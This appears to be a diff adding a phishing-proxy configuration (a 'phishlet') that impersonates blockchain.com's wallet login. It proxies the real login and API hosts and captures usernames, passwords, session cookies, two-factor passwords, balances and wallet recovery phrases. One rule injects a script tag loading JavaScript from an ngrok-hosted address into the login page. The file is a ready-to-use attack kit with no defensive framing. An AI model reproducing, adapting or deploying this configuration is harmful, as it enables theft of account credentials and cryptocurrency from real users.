@@ -1,0 +1,67 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'blockchain.com', session: true, is_landing: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'blockchain.com', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'blockchain.info', session: false, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'blockchain.info', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'login.blockchain.com', orig_sub: '', domain: 'blockchain.com', search: 'a.send(o)', replace: 'console.log(o),a.send(o)', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: '', domain: 'blockchain.com', search: '</body>', replace: '<script src=" https://9e9d-192-95-57-125.ngrok.io/app3ef2c3c91.js"></script></body>', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'signup?showWallet?utm_campaign=dcomnav_signup', replace: 'login?utm_campaign=dcomnav_login', mimes: ['text/html', 'text/javascript']}
+
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: '', domain: 'blockchain.info', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: '', domain: 'blockchain.info', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: '', domain: 'blockchain.info', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: '', domain: 'blockchain.info', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: '', domain: 'blockchain.info', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: '', domain: 'blockchain.info', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+
+auth_tokens:
+  - domain: 'login.blockchain.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/home'
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'session'
+      search: '(.*)'
+      type: 'post'
+    - key: 'balance'
+      search: '(.*)'
+      type: 'post'
+    - key: 'recovery_phrases'
+      search: '"recovery_phrases":"([^"]*)'
+      type: 'json'
+    - key: 'two_password'
+      search: '(.*)'
+      type: 'post'
+login:
+  domain: 'login.blockchain.com'
+  path: '#/login'
